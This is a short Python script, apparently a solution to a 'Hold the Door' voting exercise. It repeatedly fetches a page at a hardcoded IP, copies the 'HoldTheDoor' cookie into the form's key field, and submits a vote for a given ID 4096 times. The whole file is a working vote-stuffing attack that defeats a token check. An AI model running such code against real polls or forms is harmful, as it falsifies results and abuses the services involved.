#!/usr/bin/python
import requests
import sys
import urllib3


if (len(sys.argv) != 2):
	print("Usage: ./level0.py <ID>")
	sys.exit(1)

url = "http://158.69.76.135/level1.php"

with requests.session() as client:
	for i in range(4096):
		key = client.get(url)
		key_dic = key.cookies.get_dict()
		data_post = {
			'id': int(sys.argv[1]),
			'holdthedoor': "Submit",
			'key': key_dic['HoldTheDoor']
		}
		try:
			client.post(url, data_post)
		except OSError:
			print('\x1b[6;30;41m' + "Network us unreachable" + '\x1b[0m')
			sys.exit(1)
		except urllib3.exceptions.NewConnectionError:
			print('\x1b[6;30;41m' + "New Connection Error" + '\x1b[0m')
			sys.exit(1)

	print('\x1b[6;30;42m' + "Nice, 4096 request" + '\x1b[0m')